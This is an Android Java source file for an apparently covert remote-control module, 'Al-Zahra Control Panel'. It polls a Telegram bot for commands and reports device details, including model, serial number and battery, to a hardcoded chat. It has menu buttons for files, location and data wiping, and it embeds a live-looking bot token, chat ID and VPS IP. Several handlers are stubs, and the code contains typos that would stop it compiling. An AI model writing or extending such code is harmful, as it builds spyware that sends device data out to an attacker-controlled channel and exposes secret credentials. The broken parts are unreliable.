package com.alzahra.telegram;

import android.content.Context;
import android.content.Intent;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.TelephonyManager;

import androidx.core.content.ContextCompat;

import com.alzahra.services.CoreService;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class AdvancedBotHandler {

    private static final String BOT_TOKEN = "8353955949:AAHAl3ELWn8m-tucuf5ZktLZfTAT5G1v1gA";
    private static final String CHAT_ID = "7344776596";
    private static final String VPS_IP = "216.128.156.226"; // من بياناتك (لا أستطيع الاتصال)

    private final Context context;
    private final TelegramBot bot;
    private final Handler handler;
    private boolean isRunning = false;
    private long lastUpdateId = 0;

    public AdvancedBotHandler(Context context) {
        this.context = context;
        this.bot = new TelegramBot(BOT_TOKEN);
        this.handler = new Handler(Looper.getMainLooper());
    }

    public void start() {
        if (isRunning) return;
        isRunning = true;
        sendMainMenu();
        pollUpdates();
    }

    private void sendMainMenu() {
        String menu = "🎛️ <b>Al-Zahra Control Panel</b>\n\n" +
                "Device: " + Build.MODEL + "\n" +
                "Status: 🟢 Online\n" +
                "Time: " + getCurrentTime();

        String keyboard = "[" +
                "[{\\\"text\\\":\\\"📊 Live Status\\\",\\\"callback_data\\\":\\\"status\\\"}," +
                "{\\\"text\\\":\\\"🔄 Sync Now\\\",\\\"callback_data\\\":\\\"sync\\\"}]," +
                "[{\\\"text\\\":\\\"📱 Device Info\\\",\\\"callback_data\\\":\\\"device\\\"}," +
                "{\\\"text\\\":\\\"📁 Files\\\",\\\"callback_data\\\":\\\"files\\\"}]," +
                "[{\\\"text\\\":\\\"⏸️ Pause Auto\\\",\\\"callback_data\\\":\\\"pause\\\"}," +
                "{\\\"text\\\":\"▶️ Resume\\\",\\\"callback_data\\\":\\\"resume\\\"}]," +
                "[{\\\"text\\\":\\\"🗑️ Clean Data\\\",\\\"callback_data\\\":\\\"clean\\\"}," +
                "{\\\"text\\\":\\\"📍 Location\\\",\\\"callback_data\\\":\\\"location\\\"}]," +
                "[{\\\"text\\\":\\\"🔄 Restart\\\",\\\"callback_data\\\":\\\"restart\\\"}," +
                "{\\\"text\\\":\\\"❌ Stop\\\",\\\"callback_data\\\":\\\"stop\\\"}]" +
                "]";

        sendInlineKeyboard(menu, keyboard);
    }

    private void pollUpdates() {
        handler.postDelayed(() -> {
            if (!isRunning) return;

            bot.getUpdates(lastUpdateId + 1, updates -> {
                try {
                    if (!updates.optBoolean("ok", false)) return;

                    JSONArray result = updates.optJSONArray("result");
                    if (result == null) return;

                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.optJSONObject(i);
                        if (update == null) continue;

                        lastUpdateId = update.optLong("update_id");

                        // Handle callback queries (button clicks)
                        JSONObject callback = update.optJSONObject("callback_query");
                        if (callback != null) {
                            handleCallback(callback);
                            continue;
                        }

                        // Handle commands
                        JSONObject message = update.optJSONObject("message");
                        if (message == null) continue;

                        String text = message.optString("text", "").toLowerCase().trim();
                        if (text.equals("/start") || text.equals("/menu")) {
                            sendMainMenu();
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });

            pollUpdates();
        }, 3000);
    }

    private void handleCallback(JSONObject callback) {
        try {
            String data = callback.getString("data");
            String msgId = callback.getJSONObject("message").getString("message_id");

            switch (data) {
                case "status":
                    sendStatusReport();
                    break;
                case "sync":
                    bot.sendMessage(CHAT_ID, "⏳ Syncing data...");
                    // Trigger sync
                    break;
                case "device":
                    sendDeviceInfo();
                    break;
                case "files":
                    bot.sendMessage(CHAT_ID, "📁 Checking files...");
                    break;
                case "pause":
                    bot.sendMessage(CHAT_ID, "⏸️ Auto-sync paused");
                    break;
                case "resume":
                    bot.sendMessage(CHAT_ID, "▶️ Auto-sync resumed");
                    break;
                case "clean":
                    bot.sendMessage(CHAT_ID, "🗑️ Cleaning local data...");
                    break;
                case "location":
                    bot.sendMessage(CHAT_ID, "📍 Requesting location...");
                    break;
                case "restart":
                    bot.sendMessage(CHAT_ID, "🔄 Restarting service...");
                    break;
                case "stop":
                    bot.sendMessage(CHAT_ID, "🛑 Stopping...");
                    break;
            }

            // Answer callback to remove loading state
            answerCallback(caleback.getString("id"), "Done!");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendStatusReport() {
        BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
        int battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);

        String status = "📊 <b>Live Status Report</b>\n\n" +
                "🔋 Battery: " + battery + "%\n" +
                "📱 Device: " + Build.MODEL + "\n" +
                "🤖 Android: " + Build.VERSION.RELEASE + "\n" +
                "⏰ Time: " + getCurrentTime() + "\n\n" +
                "🟢 Service: Running\n" +
                "📤 Auto-sync: Enabled";

        bot.sendMessage(CHAT_ID, status);
    }

    private void sendDeviceInfo() {
        String info = "📱 <b>Device Information</b>\n\n" +
                "Model: " + Build.MODEL + "\n" +
                "Manufacturer: " + Build.MANUFACTURER + "\n" +
                "Device: " + Build.DEVICE + "\n" +
                "Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")\n" +
                "Product: " + Build.PRODUCT + "\n" +
                "Serial: " + Build.SERIAL + "\n" +
                "ID: " + Build.ID;

        bot.sendMessage(CHAT_ID, info);
    }

    private String getCurrentTime() {
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
    }

    private void sendInlineKeyboard(String text, String keyboardJson) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

            JSONObject json = new JSONObject();
            json.put("chat_id", CHAT_ID);
            json.put("text", text);
            json.put("parse_mode", "HTML");

            JSONObject markup = new JSONObject();
            markup.put("inline_keyboard", new JSONArray(keyboardJson));
            json.put("reply_markup", markup);

            // Send via OkHttp
            okhttp3.OkHttpClient client = new okhttp3.OkHttpClient();
            okhttp3.RequestBody body = okhttp3.RequestBody.create(
                    json.toString(), okhttp3.MediaType.parse("application/json"));
            okhttp3.Request request = new okhttp3.Request.Builder()
                    .url(url).post(body).build();
            client.newCall(request).execute().close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void answerCallback(String callbackId, String text) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/answerCallbackQuery";
            JSONObject json = new JSONObject();
            json.put("callback_query_id", callbackId);
            json.put("text", text);

            okhttp3.OkHttpClient client = new okhttp3.OkHttpClient();
            okhttp3.RequestBody body = okhttp3.RequestBody.create(
                    json.toString(), okhttp3.MediaType.parse("application/json"));
            okhttp3.Request request = new okhttp3.Request.Builder()
                    .url(url).post(body).build();
            client.newCall(request).execute().close();
        } catch (Exception e) {}
    }

    public void stop() {
        isRunning = false;
    }

    // Send alert for specific events
    public void sendAlert(String title, String message) {
        String alert = "🔔 <b>" + title + "</b>\n\n" + message;
        bot.sendMessage(CHAT_ID, alert);
    }
}
